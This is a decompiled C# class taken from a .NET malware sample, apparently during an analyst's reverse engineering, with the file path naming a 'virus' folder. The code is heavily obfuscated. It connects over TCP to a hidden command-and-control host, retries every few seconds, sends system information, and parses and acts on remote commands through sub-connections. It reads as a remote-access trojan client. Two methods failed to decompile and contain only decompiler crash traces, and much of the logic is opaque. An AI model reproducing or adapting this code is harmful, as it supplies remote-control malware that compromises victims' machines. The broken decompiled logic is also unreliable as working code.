using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

public class _________________________________________________________________________________
{
	public static Random _;

	private Thread __;

	private Thread ___;

	private TcpClient ____;

	private bool _____;

	private _________________________________________________________________________________.__________________________________________________________________________________ ______;

	public StreamWriter _______;

	public StreamReader ________;

	private string _________;

	public string __________;

	private List<___________________________________________________________________________________> ___________;

	static _________________________________________________________________________________()
	{
		_________________________________________________________________________________._ = new Random();
	}

	public _________________________________________________________________________________()
	{
		_________________________________________________________________________________ _________________________________________ = this;
		this.__ = new Thread(new ThreadStart(_________________________________________.______________));
		switch (Type.EmptyTypes.Length)
		{
			default:
			{
				_________________________________________________________________________________ _________________________________________1 = this;
				this.___ = new Thread(new ThreadStart(_________________________________________1._____________));
				this._____ = false;
				this._________ = <Module>.___<string>(-1781969633);
				this.__________ = <Module>.____<string>(816071137);
				return;
			}
		}
	}

	public void ___(byte[] byte_0)
	{
		byte[] numArray = null;
		int num = 0;
		string str = null;
		___________________________________________________________________________________ __________________________________________ = null;
		___________________________________________________________________________________ __________________________________________1 = null;
		object length;
		string str1 = this.________________(byte_0);
		string[] strArrays = Strings.Split(str1, this.__________, -1, CompareMethod.Binary);
		string str2 = strArrays[0];
		try
		{
			if (str2.Contains(<Module>.____<string>(-201016429)))
			{
				Strings.Split(str2, <Module>.______<string>(1514956238), -1, CompareMethod.Binary);
			}
			if (Operators.CompareString(str2, <Module>._______<string>(-672891509), false) == 0)
			{
				List<___________________________________________________________________________________> ______ = this.___________;
				Monitor.Enter(______);
				try
				{
					this.___________.Add(new ___________________________________________________________________________________(Conversions.ToInteger(strArrays[1]), strArrays[2], Convert.ToInt32(strArrays[3]), this));
				}
				finally
				{
					Monitor.Exit(______);
				}
			}
			if (!str2.Contains(<Module>.____<string>(-941096728)))
			{
				goto Label0;
			}
			str = str2.Replace(<Module>.____<string>(-941096728), string.Empty);
			length = sizeof(int) + -1;
		Label5:
			switch (length)
			{
				case 0:
				{
					if (__________________________________________1 == null)
					{
						goto Label1;
					}
					__________________________________________1.___________();
					goto Label1;
				}
				case 1:
				{
					__________________________________________.____________(numArray);
					break;
				}
				case 2:
				{
					goto Label2;
				}
				case 3:
				{
					__________________________________________ = this.______(Convert.ToInt32(str));
					if (__________________________________________ == null)
					{
						break;
					}
					else
					{
						goto Label2;
					}
				}
				default:
				{
					goto case 3;
				}
			}
		Label0:
			if (Operators.CompareString(str2, <Module>._____<string>(-1238008926), false) == 0)
			{
				goto Label6;
			}
		Label1:
			if (str2.Contains(<Module>._______<string>(-1842485292)))
			{
				this._________(<Module>._____<string>(-1125420329));
			}
			if (Operators.CompareString(str2, <Module>._____<string>(-183996060), false) == 0)
			{
				this.___________();
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
		return;
	Label2:
		Array arrays = this._________________(byte_0, string.Concat(str2, <Module>.____<string>(816071137)));
		object[] objArray = new object[] { 1 };
		numArray = (byte[])NewLateBinding.LateIndexGet(arrays, objArray, null);
		length = Type.EmptyTypes.Length + 1;
		goto Label5;
	Label6:
		if (sizeof(short) + -13837 != -13835)
		{
			goto Label2;
		}
		__________________________________________1 = this.______(Convert.ToInt32(strArrays[1]));
		if ((-15 | -(7 * num + 25 * num)) != -15)
		{
			length = sizeof(byte) + -1825004396;
			goto Label5;
		}
		else
		{
			length = Type.EmptyTypes.Length + 0;
			goto Label5;
		}
	}

	internal void ____(int int_0)
	{
		try
		{
			this._________(string.Concat(<Module>.___<string>(1531574613), this.__________, int_0.ToString(), this.__________));
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	internal void _____(int int_0, byte[] byte_0)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			string str = string.Concat(<Module>._______<string>(387157178), int_0.ToString(), this.__________);
			switch (Type.EmptyTypes.Length)
			{
				default:
				{
					memoryStream.Write(this._______________(str), 0, str.Length);
					memoryStream.Write(byte_0, 0, checked((int)byte_0.Length));
					this.__________(memoryStream.ToArray());
					memoryStream.Dispose();
					break;
				}
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public ___________________________________________________________________________________ ______(int int_0)
	{
		int num = 0;
		int num1 = 0;
		___________________________________________________________________________________ item;
		int length;
		List<___________________________________________________________________________________> ______ = this.___________;
		Monitor.Enter(______);
		try
		{
			int ____ = ______________________._______;
			if ((2041053184 * ____ & 347209728 * ____) == -5411)
			{
				length = -1218952436;
			}
			else
			{
				int _________ = <Module>._________________;
				if (182816 + (____ << 9) != ((_________ << 7) + 3036) * 16)
				{
					length = 24895;
				}
				else
				{
					int ______1 = <Module>.___________;
					if (______1 - 4175 == -______1)
					{
						length = 2132847833;
					}
					else if (~_________ == 2 * _________ + 14 * _________ >> 4)
					{
						length = Type.EmptyTypes.Length + 1055786927;
					}
					else
					{
						length = (3111 + (9896 ^ num) != num - 1346 ? 2003606939 : -1155387096);
					}
				}
			}
			if (24896 != length)
			{
				int count = this.___________.Count - 1;
				num1 = 0;
				while (num1 <= count)
				{
					if (this.___________[num1]._ != int_0)
					{
						num1++;
					}
					else
					{
						goto Label1;
					}
				}
				item = null;
				return item;
			}
		Label1:
			item = this.___________[num1];
		}
		finally
		{
			Monitor.Exit(______);
		}
		return item;
	}

	public void _______(int int_0)
	{
		try
		{
			List<___________________________________________________________________________________> ______ = this.___________;
			Monitor.Enter(______);
			try
			{
				int count = this.___________.Count - 1;
				int num = 0;
				switch (sizeof(Guid))
				{
					case 16:
					{
						while (num <= count)
						{
							if (this.___________[num]._ != int_0)
							{
								num++;
							}
							else
							{
								this.___________.RemoveAt(num);
								goto Label1;
							}
						}
						return;
					}
					default:
					{
						goto case 16;
					}
				}
			}
			finally
			{
				Monitor.Exit(______);
			}
		Label1:
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	internal void ________(int int_0, bool bool_0, long long_0, int int_1, string string_0)
	{
		int length = 0;
		MemoryStream memoryStream = null;
		string[] ______ = null;
		object obj;
		uint num = sizeof(int) + 23735;
		int _________ = <Module>._________________;
		string hostName = <Module>.__________((int)num, 21866, ((_________ & 1572864) != (1572864 & 1223 * _________ + 825 * _________ >> 11) ? (int)(sizeof(uint) + 449967039) : Type.EmptyTypes.Length + 69));
		try
		{
			IPHostEntry hostEntry = Dns.GetHostEntry(string_0);
			if (hostEntry != null && !string.IsNullOrEmpty(hostEntry.HostName))
			{
				hostName = hostEntry.HostName;
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			int ________ = <Module>._______________;
			hostName = <Module>.__________(((7680 & ________ % 334) != 0 ? Type.EmptyTypes.Length + -1106452178 : 67078), Type.EmptyTypes.Length + 66756, (((________ ^ ________ * 112 + ________ * 912 >> 10) & 1950272) != 0 ? Type.EmptyTypes.Length + 769464470 : 213));
			ProjectData.ClearProjectError();
		}
		try
		{
			if ((12 * _________ + 52 * _________ | -62) != -62)
			{
				goto Label0;
			}
			memoryStream = new MemoryStream();
			______ = new string[12];
			______[0] = <Module>.______<string>(-446916696);
			obj = ((2021654527 | (length / 16147 + 3664) / 1755) != 2021654527 ? Type.EmptyTypes.Length + -1836766512 : Type.EmptyTypes.Length + 2);
		Label4:
			while (true)
			{
				switch (obj)
				{
					case 0:
					{
						______[3] = this.__________;
						______[4] = hostName;
						if (length == -17210)
						{
							goto Label1;
						}
						goto case 1;
					}
					case 1:
					{
						______[7] = this.__________;
						______[8] = long_0.ToString();
						length == -9818;
						______[9] = this.__________;
						______[10] = int_1.ToString();
						obj = Type.EmptyTypes.Length + 3;
						continue;
					}
					case 2:
					{
						______[1] = this.__________;
						______[2] = Conversions.ToString(int_0);
						length = Type.EmptyTypes.Length + -17210;
						obj = sizeof(int) + -4;
						continue;
					}
					case 3:
					{
						break;
					}
					default:
					{
						goto case 2;
					}
				}
			}
			______[11] = this.__________;
			string str = string.Concat(______);
			memoryStream.Write(this._______________(str), 0, str.Length);
			this.__________(memoryStream.ToArray());
			memoryStream.Dispose();
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			ProjectData.ClearProjectError();
		}
		return;
	Label0:
	Label1:
		______[5] = this.__________;
		______[6] = bool_0.ToString();
		length = Type.EmptyTypes.Length + -551;
		obj = Type.EmptyTypes.Length + 1;
		goto Label4;
	}

	public void _________(string string_0)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			string str = string.Concat(string_0, this.__________);
			memoryStream.Write(this._______________(str), 0, str.Length);
			this.__________(memoryStream.ToArray());
			memoryStream.Dispose();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public void __________(byte[] byte_0)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(byte_0, 0, checked((int)byte_0.Length));
			memoryStream.Write(this._______________(this._________), 0, this._________.Length);
			this.____.Client.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public void ___________()
	{
		// 
		// Current member / type: System.Void _________________________________________________________________________________::___________()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void ___________()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public void ____________()
	{
		string[] _____________ = null;
		int _________ = 0;
		int num = 0;
		string str = null;
		try
		{
		Label1:
			while (!______________________________________________._)
			{
				______________________________________________________________.______________(<Module>._____<string>(1464211711), <Module>._______<string>(-1404304908));
				int ______ = <Module>.___________;
				int num1 = ((-536870912 * ______ >> 14 & 32768) == (32768 & ______ << 15) ? 22576 : Type.EmptyTypes.Length + 957365921);
				object length = sizeof(ushort) + 1;
				while (true)
				{
					switch (length)
					{
						case 0:
						{
							Thread.Sleep(5000);
							if (this.____.Client.Connected)
							{
								this.__________________(str);
								this.___________ = new List<___________________________________________________________________________________>();
								______________________________________________._ = true;
								this.__.Start();
								this.___.Start();
								return;
							}
							if (num1 == -15373)
							{
								goto case 4;
							}
							else
							{
								goto Label2;
							}
						}
						case 1:
						{
							_____________[5] = _________________________________________________________________.________();
							_____________[6] = <Module>._______<string>(1974200954);
							if (((1939 * num + num * 109 ^ (3206 & ______) >> 5) & 768) == 0)
							{
								goto case 4;
							}
							_________ = <Module>.________________;
							goto case 3;
						}
						case 2:
						{
							this.____.ReceiveBufferSize = 9999999;
							this.____.SendBufferSize = 9999999;
							num1 = (_________ - 2669 != -356515840 * _________ >> 22 ? (int)(sizeof(short) + 9735) : Type.EmptyTypes.Length + 2103540714);
							length = Type.EmptyTypes.Length + 0;
							continue;
						}
						case 3:
						{
							do
							{
								_____________ = new string[] { <Module>.___<string>(1189505955), null, null, null, null, null, null };
								num = num1;
								num1 = 32615;
								if (num != 22576)
								{
									goto case 0;
								}
								_____________[1] = ______________________________________________________________.________________________;
								_____________[2] = <Module>.____<string>(-1286171096);
								if (num1 == 31115)
								{
									goto Label1;
								}
								_____________[3] = _________________________________________________________________._________();
								_____________[4] = <Module>.______<string>(861631917);
							}
							while (num1 / 61016 == 2074733548);
							length = Type.EmptyTypes.Length + 1;
							continue;
						}
						case 4:
						{
							str = string.Concat(_____________);
							this.____ = new TcpClient(______________________________________________________________._____________, ______________________________________________________________.______________);
							if (10 * (______ * 7 + ______) + (______ * 7 + ______) * 6 != -6477)
							{
								goto case 2;
							}
							length = Type.EmptyTypes.Length + 316223022;
							continue;
						}
						default:
						{
							goto case 3;
						}
					}
				}
				this.__________________(str);
				this.___________ = new List<___________________________________________________________________________________>();
				______________________________________________._ = true;
				this.__.Start();
				this.___.Start();
				return;
			}
			______________________________________________________________.______________(<Module>.______<string>(2043928306), <Module>._______<string>(1611523509));
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>._____<string>(-1723325216), string.Concat(<Module>._______<string>(-2135718307), exception.ToString()));
			this.___________();
			ProjectData.ClearProjectError();
		}
		return;
	Label2:
		this.____.Close();
		Thread.Sleep(5000);
		goto Label1;
	}

	public void _____________()
	{
		// 
		// Current member / type: System.Void _________________________________________________________________________________::_____________()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void _____________()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public void ______________()
	{
		int length = 0;
		object[] objArray;
		int num = 0;
		byte[] numArray = null;
		Array arrays = null;
		object obj;
		MemoryStream memoryStream = new MemoryStream();
		while (true)
		{
			try
			{
			Label8:
				int _______ = <Module>._____________;
				if (1476395008 + (_______ << 22 ^ 6956) != _______ * 4194304)
				{
					goto Label0;
				}
			Label4:
				if (!this.________________(memoryStream.ToArray()).Contains(<Module>._____<string>(1355333096)))
				{
					goto Label1;
				}
				arrays = this._________________(memoryStream.ToArray(), <Module>.___<string>(-1781969633));
				length = 29033;
				int ____ = ______________________._______;
				if (~((____ << 5) - 8579) == 2 * (____ * 4 + 4 * ____))
				{
					goto Label0;
				}
				objArray = new object[] { 0 };
				this.___((byte[])NewLateBinding.LateIndexGet(arrays, objArray, null));
				length = Type.EmptyTypes.Length + 32485;
				if ((-(-5732 & length) & 3) == 0)
				{
					goto Label3;
				}
				obj = ((num % 2 & -7686) == 0 ? Type.EmptyTypes.Length + 1765411812 : Type.EmptyTypes.Length + -1854557672);
			Label6:
				while (true)
				{
					switch (obj)
					{
						case 0:
						{
							goto Label3;
						}
						case 1:
						{
							<Module>.______________ = -759738571;
							this.____.Client.Receive(numArray, 0, checked((int)numArray.Length), SocketFlags.None);
							if (length == 3465)
							{
								goto case 2;
							}
							break;
						}
						case 2:
						{
							numArray = new byte[this.____.Available - 1 + 1];
							length = ((8585 & (-1848300863 & length) * 1024) == 0 ? (int)(sizeof(ushort) + -14840) : Type.EmptyTypes.Length + 1367378952);
							obj = Type.EmptyTypes.Length + 1;
							continue;
						}
						case 3:
						{
							goto Label4;
						}
						default:
						{
							goto case 2;
						}
					}
				}
			Label11:
				memoryStream.Write(numArray, 0, checked((int)numArray.Length));
				int ______ = <Module>.__________;
				if ((______ * 14 + 50 * ______ - 3143 ^ 7564) != 0)
				{
					obj = sizeof(byte) + 2;
					goto Label6;
				}
				else
				{
					obj = Type.EmptyTypes.Length + -2125108053;
					goto Label6;
				}
			}
			catch (Exception exception)
			{
				ProjectData.SetProjectError(exception);
				ProjectData.ClearProjectError();
				break;
			}
		}
		return;
	Label0:
		if (!______________________________________________._)
		{
			this.___________();
			goto Label7;
		}
		else
		{
			goto Label7;
		}
	Label1:
		Thread.Sleep(10);
		goto Label8;
	Label3:
		memoryStream.Dispose();
		memoryStream = new MemoryStream();
		if (arrays.Length == 2)
		{
			goto Label9;
		}
		else
		{
			goto Label1;
		}
	Label7:
		if (this.____.Available <= 0)
		{
			goto Label1;
		}
		obj = Type.EmptyTypes.Length + 2;
		goto Label6;
	Label9:
		if (length != 32485)
		{
			goto Label11;
		}
		object[] objArray1 = new object[] { 1 };
		byte[] numArray1 = (byte[])NewLateBinding.LateIndexGet(arrays, objArray1, null);
		objArray = new object[] { 1 };
		memoryStream.Write(numArray1, 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet(arrays, objArray, null), null, <Module>._______<string>(-39689601), new object[0], null, null, null)));
		Thread.Sleep(1);
		goto Label4;
	}

	public byte[] _______________(string string_0)
	{
		return Encoding.Default.GetBytes(string_0);
	}

	public string ________________(byte[] byte_0)
	{
		return Encoding.Default.GetString(byte_0);
	}

	public Array _________________(byte[] byte_0, string string_0)
	{
		Array arrays = null;
		int num = 0;
		object length;
		List<byte[]> numArrays = new List<byte[]>();
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream memoryStream1 = new MemoryStream();
		string[] strArrays = Strings.Split(this.________________(byte_0), string_0, -1, CompareMethod.Binary);
		int ____ = ______________________._______;
		if ((____ >> 25) + 18178048 == ____ % 168693468 >> 17)
		{
			if ((-(925 | <Module>._________________) & 537) != 1)
			{
				goto Label2;
			}
			length = sizeof(Guid) + 280464842;
			goto Label0;
		}
		else
		{
			length = Type.EmptyTypes.Length + 0;
			goto Label0;
		}
	Label2:
		memoryStream.Write(byte_0, 0, strArrays[0].Length);
		if ((-3747 ^ 1996488704 * num) != 0)
		{
			length = Type.EmptyTypes.Length + 1;
		}
		else if ((-2113888181 + <Module>._________________ / 1445 | 2147483647) != -1)
		{
			length = Type.EmptyTypes.Length + 877233698;
		}
		else
		{
			length = sizeof(long) + -1901552341;
		}
	Label0:
		switch (length)
		{
			case 1:
			{
				<Module>._____ = arrays;
				memoryStream1.Write(byte_0, strArrays[0].Length + string_0.Length, checked((int)byte_0.Length) - (strArrays[0].Length + string_0.Length));
				numArrays.Add(memoryStream.ToArray());
				numArrays.Add(memoryStream1.ToArray());
				memoryStream.Dispose();
				memoryStream1.Dispose();
				return numArrays.ToArray();
			}
			default:
			{
				goto Label2;
			}
		}
	}

	public void __________________(string string_0)
	{
		try
		{
			this._______ = new StreamWriter(this.____.GetStream());
			this._______.WriteLine(string.Concat(<Module>._______<string>(1020359086), string_0));
			this._______.Flush();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			this.___________();
			ProjectData.ClearProjectError();
		}
	}

	private event _________________________________________________________________________________.__________________________________________________________________________________ _
	{
		add
		{
			this.______ += value;
		}
		remove
		{
			this.______ -= value;
		}
	}

	private delegate void __________________________________________________________________________________(string string_0);
}